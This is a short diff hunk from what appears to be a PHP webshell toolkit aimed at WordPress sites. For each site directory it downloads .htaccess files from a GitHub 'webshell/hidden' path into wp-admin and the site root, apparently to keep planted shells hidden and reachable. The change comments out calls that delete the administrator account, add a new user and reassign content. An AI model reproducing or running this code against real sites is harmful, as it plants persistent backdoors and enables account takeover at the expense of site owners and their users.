@@ -214,9 +214,9 @@ foreach ($websiteDirs as $nowdir) {
     createHtaccess($nowdir . '/wp-admin', 'https://raw.githubusercontent.com/justikail/webshell/main/hidden/.htaccess_wpadmin');
     createHtaccess($nowdir, 'https://raw.githubusercontent.com/justikail/webshell/main/hidden/.htaccess');
 
-    deleteUser('administrator');
-    addUser();
-    reassignContentAndDeleteUsers();
+    // deleteUser('administrator');
+    // addUser();
+    // reassignContentAndDeleteUsers();
 }
 
 ?>
